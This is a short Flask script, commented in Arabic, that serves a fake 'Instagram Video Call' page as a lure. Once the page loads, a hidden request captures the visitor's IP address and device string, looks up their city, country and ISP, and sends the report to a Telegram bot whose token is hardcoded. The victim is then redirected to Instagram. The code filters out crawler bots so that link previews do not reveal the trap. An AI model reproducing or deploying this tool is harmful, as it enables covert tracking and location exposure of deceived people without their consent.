from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# بياناتك
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091"

@app.route('/')
def call_trap():
    # واجهة "اتصال فيديو إنستجرام" للتمويه
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram Video Call</title>
        <style>
            body { background: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .profile-pic { width: 100px; height: 100px; border-radius: 50%; background: #333; margin-bottom: 20px; border: 2px solid #fff; }
            .status { font-size: 18px; margin-bottom: 10px; }
            .calling { font-size: 14px; color: #aaa; animation: blink 1s infinite; }
            @keyframes blink { 0% {opacity: 0;} 50% {opacity: 1;} 100% {opacity: 0;} }
        </style>
        <script>
            // محاولة سحب الـ IP بمجرد "تحميل" المعاينة
            function capture() {
                fetch('/log-silent').then(() => {
                    // بعد الصيد، نحوله لإنستجرام
                    setTimeout(() => { window.location.href = "https://instagram.com"; }, 2000);
                });
            }
            window.onload = capture;
        </script>
    </head>
    <body>
        <div class="profile-pic"></div>
        <div class="status">Instagram User</div>
        <div class="calling">جاري الاتصال...</div>
    </body>
    </html>
    """)

@app.route('/log-silent')
def log_silent():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', 'Unknown')
    
    # استبعاد البوتات الأمريكية المزعجة (Facebook/Amazon)
    if any(bot in ua.lower() for bot in ['facebook', 'amazon', 'vercel', 'bot']):
        return "", 204

    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        report = (
            f"📞 <b>تم الصيد عبر فخ الاتصال!</b>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            f"📍 <b>الموقع:</b> {r.get('city')}, {r.get('country')}\n"
            f"🏢 <b>المزود:</b> {r.get('isp')}\n"
            f"📱 <b>الجهاز:</b> <code>{ua[:50]}...</code>"
        )
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": report, "parse_mode": "HTML"})
    except: pass
    return "", 204

if __name__ == '__main__':
    app.run()
